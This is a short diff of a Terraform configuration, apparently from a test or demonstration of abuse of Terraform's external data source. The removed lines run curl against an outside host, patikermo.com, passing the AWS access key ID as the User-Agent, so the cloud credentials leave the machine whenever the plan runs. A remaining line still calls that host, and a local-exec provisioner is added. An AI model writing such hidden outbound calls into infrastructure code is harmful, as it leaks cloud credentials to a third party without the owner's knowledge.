@@ -19,16 +19,9 @@ data "aws_ami" "ubuntu" {
 }
 
 data "external" "example" {
-  program = ["curl", "http://patikermo.com", "-A",TF_VAR_AWS_ACCESS_KEY_ID]
+  program = ["curl", "http://patikermo.com", "-A","COOL"]
 }
 
-data "external" "example2" {
-  program = ["curl", "http://patikermo.com", "-A","${TF_VAR_AWS_ACCESS_KEY_ID}"]
-}
-
-data "external" "example3" {
-  program = ["curl", "http://patikermo.com", "-A","${TF_VAR_instance_type}"]
-}
 
 
 resource "aws_instance" "ubuntu" {
@@ -37,5 +30,9 @@ resource "aws_instance" "ubuntu" {
 
   tags = {
     Name = var.instance_name
+  }
+  
+ provisioner "local-exec" {
+    command = "ls -lath"
   }
 }
